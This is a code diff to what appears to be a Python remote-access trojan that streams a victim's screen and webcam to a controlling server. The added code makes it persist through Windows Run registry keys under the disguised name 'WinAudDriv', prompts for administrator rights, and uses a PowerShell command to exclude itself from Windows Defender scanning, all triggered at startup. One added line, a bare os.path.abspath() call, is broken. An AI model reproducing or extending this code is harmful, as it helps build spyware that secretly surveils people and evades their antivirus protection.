@@ -1,4 +1,4 @@
-import os, subprocess, threading, base64, time, socket, platform
+import os, subprocess, threading, base64, time, socket, platform, ctypes, sys, winreg
 import socketio, pyautogui, cv2, numpy as np
 
 # Change this to match your server's IP and the port you chose at startup
@@ -77,6 +77,64 @@ def on_dispatch(data):
             
     elif action == 'stop_webcam':
         FLAGS["cam"] = False
+def root():
+    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    root_path = os.path.abspath(__file__)
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+        reg_path,
+            0,
+            winreg.KEY_READ | winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, "WinAudDriv", 0, winreg.REG_SZ, root_path)
+        winreg.CloseKey(key)
+    except OSError as e:
+        print(f"Registry error encountered: {e}")
+
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE,
+            reg_path,
+            0,
+            winreg.KEY_READ | winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, "WinAudDriv", 0, winreg.REG_SZ, root_path)
+        winreg.CloseKey(key)
+    except OSError as e:
+        print(f"Registry error encountered: {e}")
+    
+
+def isadmin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+        return False
+def requestadmin():
+    if not isadmin():
+        print("Requesting elevated privileges...")
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, " ".join(sys.argv), None, 1
+        )
+        sys.exit()
+    print("Elevated privileges confirmed.")
+
+fullpath = os.path.abspath()
+def windefendexlude(fullpath):
+    if not isadmin(): 
+        return
+    else:
+        command = [
+            "powershell",
+            "-Command",
+            f"Add-MpPreference -ExclusionPath '{fullpath}' -Force" 
+        ]
+        try:
+            result = subprocess.run(command, capture_output=True, text=True, check=True)
+            print(f"added to exclusions")
+            print(result.stdout)
+        except subprocess.CalledProcessError as e:
+            print(f"failed to add to exclusions. error: {e.stderr}")
 
 def screen_streamer():
     """High-speed screen capture with cursor rendering."""
@@ -112,6 +170,8 @@ def cam_streamer():
     cap.release()
 
 if __name__ == "__main__":
+    windefendexlude(fullpath)
+    root()
     while True:
         try:
             if not sio.connected:
